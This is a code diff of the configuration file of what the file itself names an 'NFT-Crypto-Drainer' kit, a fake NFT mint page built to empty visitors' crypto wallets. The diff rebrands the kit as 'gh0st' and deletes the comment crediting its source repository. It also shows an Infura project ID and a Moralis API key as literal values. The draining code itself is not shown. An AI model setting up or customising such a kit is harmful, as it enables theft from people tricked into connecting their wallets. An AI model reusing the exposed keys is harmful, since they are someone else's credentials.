@@ -4,8 +4,8 @@ const infuraId = "ad639389a3d245fb9ff03d212d6b2d53"     // Infuria Project ID | 
 const moralisApi = "nqIlvHlLAMmkX1N8Zdg5QwzGwZ1ry5vYiBzwRy22SKLqfHCmJsxo7gmeuZBFzc9I"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Tec.sellix.io",
-    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    name: "gh0st",
+    title: "gh0st", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "10.07.2022", // Today date
     socialMedia: {
         discord: "https://discord.gg/example",
@@ -38,7 +38,7 @@ const nftsInfo = {
 }
 
 /* 
-    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
+    | = = = | gh0st | = = = | 
 */
 
 //#region Check Configuration
